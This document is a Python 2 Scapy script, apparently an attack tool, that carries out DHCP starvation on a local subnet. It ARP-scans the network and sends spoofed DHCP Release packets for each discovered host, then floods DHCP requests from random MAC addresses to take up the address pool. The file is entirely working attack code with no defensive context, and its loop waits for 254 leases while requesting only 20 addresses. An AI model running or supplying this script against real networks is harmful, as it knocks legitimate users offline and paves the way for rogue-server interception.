from scapy.all import *
from time import sleep
from threading import Thread

class DHCPStarvation(object):
	def __init__(self):
		
		# NetworkID	
		self.net_id = "192.168.1."
		
		# NIC identification
		self.nic = "eth0"		
		
		# Attacker's IP address
		self.attacker_host_id = 10
		
		# Attacker's IP address
		self.attacker_host_id2 = 11

		# DHCP server's IP address
		self.dhcp_server_ip = "192.168.1.1"
				
		# Generated MAC stored to avoid same MAC requesting for different IP
		self.mac = [""]

		# Requested IP stored to identify registered IP
		self.ip = []
	
	def handle_dhcp(self, pkt):
		attacker_ip = 	self.net_id + str(self.attacker_host_id)
		attacker_ip2 = 	self.net_id + str(self.attacker_host_id2)	
		if pkt[DHCP]:
			# if DHCP server reply ACK, the requested IP address is registered
			# attacker_ip is IP for attacker, not to be starved
			
			if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != attacker_ip and pkt[IP].dst != attacker_ip2 :
				self.ip.append(pkt[BOOTP].yiaddr)
				print str(pkt[BOOTP].yiaddr) + " registered"

			elif pkt[DHCP].options[0][1]==6:
				print "NAK received"

	def listen(self):
		# sniff DHCP packets
		sniff(filter="udp and (port 67 or port 68)", prn=self.handle_dhcp, store=0)
	
	def start(self):
		# start packet listening thread
		thread = Thread(target=self.listen)
		thread.start()
		print "Start flooding DHCP Release"
		self.release()

		print "Starting DHCP starvation..."

		# Keep starving until all targets are registered
		# excepts the attacker' address
		
		while len(self.ip) < 254:
			print "Get: " +  str(len(self.ip))			
			self.starve()
		print "Targeted IP address starved"
		
	def release(self):
		#Found MAC address of DHCP Server
		conf.verb = 0
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = self.dhcp_server_ip), timeout = 2, iface = self.nic, inter = 0.1)
		for snd,rcv in ans:
			self.dhcp_server_mac = rcv.sprintf(r"%Ether.src%")

		#ARP scanning to found all host in network
		iprange = self.net_id + "0/24"
		conf.verb = 0;
		ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=iprange), iface = self.nic, timeout=2)
		attacker_ip = self.net_id + str(self.attacker_host_id)
		attacker_ip2 = self.net_id + str(self.attacker_host_id2)
		#flood DHCP Release
		for snd, rcv in ans:
			src_mac = rcv.sprintf(r"%Ether.src%")			
			released_ip = rcv.sprintf(r"%ARP.psrc%")
			print src_mac
			print released_ip			
			if (released_ip == self.dhcp_server_ip):
				#dhcp_server_mac = src_mac;
				continue
			if (released_ip == attacker_ip): continue
			if (released_ip == attacker_ip2): continue
			# generate DHCP Release packet
			pkt = Ether(src = src_mac, dst = self.dhcp_server_mac)
			pkt /= IP(src=released_ip, dst=self.dhcp_server_ip)
			pkt /= UDP(sport=68, dport=67)
			pkt /= BOOTP(chaddr=[mac2str(src_mac)], ciaddr=released_ip, xid=random.randint(0, 0xFFFFFFFF))
			pkt /= DHCP(options=[("message-type", "release"), \
						("server_id", self.dhcp_server_ip), \
						("client_id",mac2str(src_mac)),\
						"end"])
			sendp(pkt)
			print "Released "+released_ip
			sleep(1)  # interval to avoid congestion and packet loss

	def starve(self):
		for i in range(100,121):
			# don't request the attacker' address
			if i == self.attacker_host_id: continue
			if i == self.attacker_host_id2: continue
			# generate IP we want to request
			# if IP already registered, then skip
			requested_addr = self.net_id + str(i)
			if requested_addr in self.ip:
				continue
            
			# generate MAC, avoid duplication
			src_mac = ""
			while src_mac in self.mac:
				src_mac = RandMAC()
			self.mac.append(src_mac)
			
			# generate DHCP request packet
			
			pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
			pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
			pkt /= UDP(sport=68, dport=67)
			pkt /= BOOTP(chaddr=src_mac, xid=random.randint(0, 0xFFFFFFFF))
			pkt /= DHCP(options=[("message-type", "request"), \
						("requested_addr", requested_addr), \
						"end"])
			sendp(pkt)
			
			print "Trying to occupy " + requested_addr
			sleep(0.5)  # interval to avoid congestion and packet loss

if __name__ == "__main__":
    starvation = DHCPStarvation()
    starvation.start()
